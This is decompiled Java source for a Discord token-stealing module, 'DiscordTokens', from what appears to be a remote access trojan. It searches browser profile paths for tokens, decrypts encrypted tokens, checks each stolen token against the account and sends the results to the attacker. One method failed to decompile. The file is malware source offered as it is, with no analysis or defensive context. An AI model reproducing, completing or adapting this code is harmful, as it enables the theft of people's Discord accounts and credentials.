//Raddon On Top!

package org.rat.payload.payloads.discord;

import org.rat.payload.*;
import java.nio.charset.*;
import java.util.regex.*;
import java.nio.file.*;
import java.io.*;
import java.util.*;

public class DiscordTokens implements IPayload
{
    public static List<String> tokens;
    
    public void run() {
        for (final String path : Helper.getManager().getPaths()) {
            if (path.contains("Firefox")) {
                this.getTokens(path, true);
            }
            else {
                this.getTokens(path, false);
            }
        }
        if (DiscordTokens.tokens.size() == 0) {
            this.send("No tokens");
        }
    }
    
    public void getTokens(final String path, final boolean firefox) {
        // This method could not be decompiled.
        throw new IllegalStateException("An error occurred while decompiling this method.");
    }
    
    public void parseToken(final String line, final String regex) {
        final Pattern p = Pattern.compile(regex);
        final Matcher m = p.matcher(line);
        while (m.find()) {
            String token = m.group();
            if (m.group().startsWith("dQw4w9WgXcQ")) {
                try {
                    Helper.getChecker();
                    token = Checker.decryptToken(m.group());
                }
                catch (Exception ex) {}
            }
            if (!DiscordTokens.tokens.contains(token)) {
                Long.parseLong(new String(Base64.getDecoder().decode(token.split("\\.")[0]), StandardCharsets.UTF_8));
                this.send("```" + Helper.getChecker().checkUser(token) + "```");
                DiscordTokens.tokens.add(token);
            }
        }
    }
    
    static {
        DiscordTokens.tokens = new ArrayList<String>();
    }
}
